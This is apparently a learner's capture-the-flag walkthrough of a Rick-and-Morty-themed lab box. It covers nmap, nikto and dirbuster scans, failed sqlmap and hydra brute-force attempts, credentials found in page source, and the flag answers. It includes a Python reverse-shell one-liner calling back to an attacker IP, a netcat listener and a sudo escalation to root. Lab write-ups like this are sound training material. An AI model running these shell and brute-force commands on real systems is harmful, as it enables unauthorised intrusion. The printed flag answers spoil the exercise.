Scanning<br>
<br>
nmap -T4 -A -Pn -sVC 10.10.225.222<br>
<br>
RESULT:<br>
PORT   STATE SERVICE VERSION<br>
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)<br>
| ssh-hostkey: <br>
|   2048 8dc8bd73a912a6ac348d26e829113629 (RSA)<br>
|   256 d0d9128461502b4879d7a06130f48f99 (ECDSA)<br>
|_  256 85df59dd64afde1e6854939aed3b3eab (ED25519)<br>
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))<br>
|_http-title: Rick is sup4r cool<br>
|_http-server-header: Apache/2.4.18 (Ubuntu)<br>
<br>
Port 80 for web app and 22 for ssh, crawling port 80 to check directories with dirbuster:<br>
<br>
Target url: http://10.10.225.222/ <br>
60 threats<br>
Wordlist: /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt <br>
<br>
RESULT:<br>
<br>  
http://10.10.225.222:80/<br>
http://10.10.225.222:80/icons/<br>
http://10.10.225.222:80/portal.php<br>
http://10.10.225.222/assets/<br>
http://10.10.225.222/assets/jquery.min.js<br>
http://10.10.225.222/assets/bootstrap.min.js<br>
http://10.10.225.222:80/login.php<br>
http://10.10.225.222/assets/bootstrap.min.css<br>
http://10.10.225.222:80/icons/small/<br>
http://10.10.225.222:80/denied.php<br>
http://10.10.225.222:80/server-status/<br>
<br>
We have some interesting urls, portal.php redirects to login.php.<br>
We have also an Apache/2.4.18 that is vulnerable and we can bypass the authentification, don't know how...<br>
I can try to list vulnerabilities with Nikto:<br>
<br>
nikto -host 10.10.225.222:80 <br>
<br>
RESULT:<br>
<br>
- Nikto v2.1.6<br>
---------------------------------------------------------------------------<br>
+ Target IP:          10.10.225.222<br>
+ Target Hostname:    10.10.225.222<br>
+ Target Port:        80<br>
+ Start Time:         2022-12-23 18:40:24 (GMT1)<br>
---------------------------------------------------------------------------<br>
+ Server: Apache/2.4.18 (Ubuntu)<br>
+ The anti-clickjacking X-Frame-Options header is not present.<br>
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS<br>
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type<br>
+ No CGI Directories found (use '-C all' to force check all possible dirs)<br>
+ Server may leak inodes via ETags, header found with file /, inode: 426, size: 5818ccf125686, mtime: gzip<br>
<br>
There we can see that the Apache is vulnerable, i'm going to try to find some info about how to exploit this version:<br>
https://www.infosecmatter.com/nessus-plugin-library/?id=122059<br>
Seems we are talking about the "Vulnhub" exploit? <br>
https://github.com/vshaliii/DC-3-Vulnhub-Walkthrough<br>
There is a lot of info, i'm going to try some othe scanning scripts:<br>
nmap -p80 -sV -A --script vuln 10.10.225.222<br>
RESULT:<br>
<br>
Pre-scan script results:<br>
| broadcast-avahi-dos: <br>
|   Discovered hosts:<br>
|     224.0.0.251<br>
|   After NULL UDP avahi packet DoS (CVE-2011-1002).<br>
|_  Hosts are all up (not vulnerable).<br>
<br>
There is a CVE-2011-1002, related with the DoS, could this be usefull?<br>
The enumeration part that comes here i don't understand, just trying this:<br>
<br>
sqlmap -u "http://10.10.225.222:80/login.php"-p list[fullordering] --dbs --batch
<br>
RESULT:<br>
[*] starting @ 18:51:59 /2022-12-23/<br>
<br>
[18:51:59] [INFO] testing connection to the target URL<br>
[18:52:00] [CRITICAL] page not found (404)<br>
it is not recommended to continue in this kind of cases. Do you want to quit and make sure that everything is set up properly? [Y/n] Y<br>
[18:52:00] [WARNING] HTTP error codes detected during run:<br>
404 (Not Found) - 1 times<br>
<br>
[*] ending @ 18:52:00 /2022-12-23/<br>
<br>
Well, the sqlmap does't seems to be working. Checking the CVE-2011-1002:<br>
https://www.cvedetails.com/cve/CVE-2011-1002/<br>
There is info there but idk how to bypass the auth...<br>
I can try to bruteforce the login page:<br>
<br>
hydra -l rick -P /home/wapre/Documentos/rockyou_20_12_2022.txt 10.10.225.222 https-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V<br>
<br>
RESULT:<br>
Can not ignore the restore file with the -I ... <br>
It also give me a lot of error connected, i still believe that we can bypass this, but don't know how...<br>
Well, from now on, i'll follow this video: <br>
https://www.youtube.com/watch?v=oCAtfcr3iUw<brZ
<br>
<br>
<br>
So, i forgot to check the source code!<br>
There is a note with a username:<br>
<!--<br>
<br>
    Note to self, remember username!<br>
<br>
    Username: R1ckRul3s<br>
<br>
  --><br>
<br>
There is also some word in the http://10.10.225.222/robots.txt:<br>
Wubbalubbadubdub<br>
<br>
That is the password of the user found before!<br>
Now we have access to the a command line, i stopped the video here:<br>
<br>
ls -> Sup3rS3cretPickl3Ingred.txt <br>
http://10.10.225.222/Sup3rS3cretPickl3Ingred.txt <br>
mr. meeseek hair<br>
<br>
That is the result of Task 1!! <br>
<br>
<br>
We have more directories to go:<br>
Sup3rS3cretPickl3Ingred.txt -> that is the 1rst ingredient<br>
assets -> a list of pictures/gif etc... doesn't seem too interesting<br>
clue.txt -> Look around the file system for the other ingredient. <br>
denied.php -> don't have access yet<br>
index.html -> main page<br>
login.php<br>
portal.php<br>
robots.txt<br>
<br>
Well seems that i have to "Look around the file system for the other ingredient", back in the command line, i tried cd, sudo su, ssh, and only seems to be working with "ls"<br>
then i saw that ls ../../../ is giving me more info<br>
ls ../../../../home/rick/ -> second ingredients<br>
<br>
There is some info but idk how to move it, maybe i can copy it to: /var/www/html ??? <br>
ls ../../../home/rick/ | mv second_ingredients.html /var/www/html<br>
is does't work, even with mv or cp, i think i can't use |<br>
Then i started again the video:<br>
<br>
<br>
<br>
So, with: "grep . -R" we hace access to all the files of the directory and we can also inspect the source code.<br>
python3 -c "print('hello')" -> seems to work!<br>
https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet<br>
this is a cheat sheet for reverse shells<br>
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python<br>
another cheat sheat for reverse shell<br>
python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.18.73.214",9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'<br>
<br>
we changed the IP address with the one in "tun0" on "ip a" -> 10.18.73.214<br>
and the port "1234" with the "9999"<br>
and of course, replace "python" for "python3"<br>
<br>
Now we need to create a server listening to the port selected before:<br>
nc -lnvp 9999<br>
listening on [any] 9999 ...<br>
<br>
Now we can start our query:<br>
python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.18.73.214",9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'<br>
<br>
There we have a reverse shell<br>
we need to stabiilize it:<br>
https://github.com/JohnHammond/poor-mans-pentest<br>
<br>
we can run: sudo bash<br>
then we are root<br>
so we can go to:<br>
cd ../../../home/rick<br>
grep . -R <br>
second ingredients:1 jerry tear<br>
<br>
And we can also go to:<br>
cd root<br>
grep . -R<br>
3rd.txt:3rd ingredients: fleeb juice<br>
<br>
DONE<br>


